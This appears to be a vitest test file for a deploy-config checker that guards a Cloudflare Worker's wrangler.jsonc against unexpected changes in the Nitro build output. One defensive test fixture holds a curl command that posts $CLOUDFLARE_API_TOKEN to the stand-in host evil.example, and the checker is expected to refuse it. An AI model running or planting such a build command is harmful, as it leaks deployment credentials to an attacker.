import { readFileSync } from 'node:fs'
import { describe, expect, it } from 'vitest'
import { configProblems, expectedConfig, NITRO_ADDS, parseJsonc } from './deploy-config'

type Config = Parameters<typeof configProblems>[0]
const source = parseJsonc(readFileSync('wrangler.jsonc', 'utf8')) as Config
/** What Nitro writes for the reviewed source, key order shuffled as Nitro does. */
const built = (): Config => {
  const { compatibility_date, ...rest } = expectedConfig(source)
  return { compatibility_date, $schema: 'node_modules/wrangler/config-schema.json', ...rest }
}

describe('parseJsonc', () => {
  it('reads the repository wrangler.jsonc, comments and trailing commas included', () => {
    expect(source).toMatchObject({ name: 'slackwater-xyz', workers_dev: true })
    expect(source.routes).toEqual([
      { pattern: 'slackwater.xyz', custom_domain: true },
      { pattern: 'www.slackwater.xyz', custom_domain: true },
    ])
  })

  it('keeps a // inside a string', () => {
    expect(parseJsonc('{ "url": "https://example.com/a", /* x */ "b": [1, 2,], // y\n }')).toEqual({ url: 'https://example.com/a', b: [1, 2] })
  })

  it('keeps an escaped quote inside a string', () => {
    expect(parseJsonc('{ "a": "say \\"//hi\\"" }')).toEqual({ a: 'say "//hi"' })
  })
})

describe('configProblems', () => {
  it('accepts what Nitro writes for the reviewed source', () => {
    expect(configProblems(source, built())).toEqual([])
  })

  it('matches the config the current Nitro build writes', () => {
    // When this fails after a Nitro or wrangler upgrade, the deploy would
    // refuse too: update NITRO_ADDS from the new .output/server/wrangler.json.
    const outputPath = '.output/server/wrangler.json'
    let output: Config
    try {
      output = JSON.parse(readFileSync(outputPath, 'utf8'))
    } catch (error) {
      // CI builds before it tests, so a missing or unreadable config there is
      // a build that stopped writing it: fail here, not at the deploy.
      if (process.env.CI) throw error
      return // no build here
    }
    expect(configProblems(source, output)).toEqual([])
  })

  it('refuses a build command, which would run beside the token', () => {
    expect(configProblems(source, { ...built(), build: { command: 'curl https://evil.example -d "$CLOUDFLARE_API_TOKEN"' } }))
      .toEqual(['`build` is set: wrangler would run its command beside the token'])
  })

  it('refuses another Worker, hostname or binding', () => {
    expect(configProblems(source, { ...built(), name: 'open-waters-ais' })).toEqual(['`name` differs from wrangler.jsonc'])
    expect(configProblems(source, { ...built(), routes: [{ pattern: 'openwaters.io', custom_domain: true }] }))
      .toEqual(['`routes` differs from wrangler.jsonc'])
    expect(configProblems(source, { ...built(), kv_namespaces: [{ binding: 'KV', id: 'abc' }] }))
      .toEqual(['`kv_namespaces` is not in wrangler.jsonc'])
    expect(configProblems(source, { ...built(), assets: { ...(built().assets as object), directory: '/' } }))
      .toEqual(['`assets` differs from wrangler.jsonc'])
  })

  it('refuses a config missing what Nitro adds', () => {
    const { main: _main, ...rest } = built()
    expect(configProblems(source, rest)).toEqual(['`main` is missing'])
    expect(NITRO_ADDS.main).toBe('index.mjs')
  })
})
